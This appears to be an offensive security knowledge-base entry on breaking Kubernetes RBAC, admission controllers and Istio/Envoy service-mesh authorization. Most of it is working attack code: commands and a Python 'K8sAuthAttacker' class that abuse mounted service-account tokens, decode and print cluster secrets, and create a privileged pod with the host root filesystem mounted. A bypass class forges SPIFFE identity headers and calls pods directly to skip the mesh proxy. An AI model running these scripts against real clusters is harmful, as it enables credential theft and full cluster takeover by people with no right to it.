# KB-37: Kubernetes & Service Mesh Auth Exploitation

## Overview

Kubernetes RBAC, admission controllers, and service mesh (Istio/Envoy/Linkerd) authorization policies present complex attack surfaces for auth bypass and privilege escalation.

---

## 1. Kubernetes RBAC Bypass Chains

### 1.1 ServiceAccount Token Abuse

```bash
# Default SA token mounted at /var/run/secrets/kubernetes.io/serviceaccount/token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# Check permissions
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"*","resource":"*"}}}'

# List secrets (if allowed)
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/default/secrets"
```

### 1.2 CVE-2025-1974 — IngressNightmare

```
CVSS: 9.8 (Critical)
Unauthenticated RCE via NGINX Ingress Controller admission webhook

# The admission webhook validates Ingress objects but processes
# attacker-controlled annotations without proper sanitization
# This leads to config injection -> RCE -> cluster takeover

# Detection
kubectl get validatingwebhookconfigurations | grep ingress
kubectl get pods -n ingress-nginx -o jsonpath='{.items[*].spec.containers[*].image}'
```

### 1.3 RBAC Escalation Techniques

```python
class K8sAuthAttacker:
    def __init__(self, api_server, token):
        self.api = api_server
        self.headers = {'Authorization': f'Bearer {token}'}

    def check_permissions(self):
        resources = ['pods', 'secrets', 'configmaps', 'deployments',
                     'serviceaccounts', 'clusterroles', 'clusterrolebindings',
                     'nodes', 'namespaces']
        verbs = ['get', 'list', 'create', 'delete', 'patch']
        for resource in resources:
            for verb in verbs:
                body = {"apiVersion": "authorization.k8s.io/v1",
                        "kind": "SelfSubjectAccessReview",
                        "spec": {"resourceAttributes": {"verb": verb, "resource": resource}}}
                resp = requests.post(f"{self.api}/apis/authorization.k8s.io/v1/selfsubjectaccessreviews",
                                     headers=self.headers, json=body, verify=False)
                if resp.json().get('status', {}).get('allowed'):
                    print(f"[+] Allowed: {verb} {resource}")

    def steal_secrets(self, namespace='default'):
        resp = requests.get(f"{self.api}/api/v1/namespaces/{namespace}/secrets",
                            headers=self.headers, verify=False)
        if resp.status_code == 200:
            for secret in resp.json().get('items', []):
                print(f"[+] Secret: {secret['metadata']['name']}")
                for k, v in secret.get('data', {}).items():
                    import base64
                    print(f"    {k}: {base64.b64decode(v).decode(errors='replace')[:100]}")

    def create_privileged_pod(self, namespace='default'):
        pod = {
            "apiVersion": "v1", "kind": "Pod",
            "metadata": {"name": "priv-pod", "namespace": namespace},
            "spec": {
                "containers": [{
                    "name": "pwn",
                    "image": "ubuntu",
                    "command": ["/bin/bash", "-c", "sleep 3600"],
                    "securityContext": {"privileged": True},
                    "volumeMounts": [{"name": "host", "mountPath": "/host"}]
                }],
                "volumes": [{"name": "host", "hostPath": {"path": "/"}}],
                "serviceAccountName": "default"
            }
        }
        resp = requests.post(f"{self.api}/api/v1/namespaces/{namespace}/pods",
                             headers=self.headers, json=pod, verify=False)
        if resp.status_code == 201:
            print("[CRITICAL] Privileged pod created — host filesystem mounted")
```

---

## 2. Service Mesh RBAC Bypass

### 2.1 Istio AuthorizationPolicy Bypass

```bash
# Check Istio policies
kubectl get authorizationpolicies -A

# Bypass via direct pod-to-pod communication (skip Envoy sidecar)
# If network policies don't enforce mesh traffic, direct calls bypass Istio RBAC
curl http://target-pod-ip:8080/admin  # Direct, bypasses Envoy

# Header injection — Istio trusts x-forwarded-client-cert
curl -H "x-forwarded-client-cert: By=service-a;URI=spiffe://cluster.local/ns/default/sa/admin" \
  http://target-service/admin
```

### 2.2 Envoy Filter Bypass

```python
class ServiceMeshBypass:
    def __init__(self, target_service):
        self.target = target_service

    def test_direct_pod_access(self, pod_ip, port=8080):
        resp = requests.get(f"http://{pod_ip}:{port}/admin")
        if resp.status_code == 200:
            print(f"[CRITICAL] Direct pod access bypasses mesh: {pod_ip}:{port}")

    def test_header_injection(self):
        headers = [
            {'x-forwarded-client-cert': 'By=spiffe://cluster.local/ns/admin/sa/admin'},
            {'x-envoy-original-path': '/public'},  # Path rewrite
            {'x-request-id': '../admin'},  # Path traversal in routing
        ]
        for h in headers:
            resp = requests.get(f"{self.target}/admin", headers=h)
            if resp.status_code == 200:
                print(f"[CRITICAL] Mesh bypass via header: {h}")
```

---

## 3. Admission Controller Exploitation

```bash
# List admission controllers
kubectl get validatingwebhookconfigurations
kubectl get mutatingwebhookconfigurations

# Test if admission webhooks can be bypassed
# 1. Create resource in namespace not covered by webhook
# 2. Use API server direct access if webhook is down
# 3. Exploit failurePolicy: Ignore — if webhook is unreachable, request allowed
```

## References

- CVE-2025-1974: IngressNightmare (NGINX Ingress RCE)
- CVE-2024-21626: runc container escape
- Kubernetes RBAC documentation
- Istio AuthorizationPolicy documentation
- Envoy proxy security model
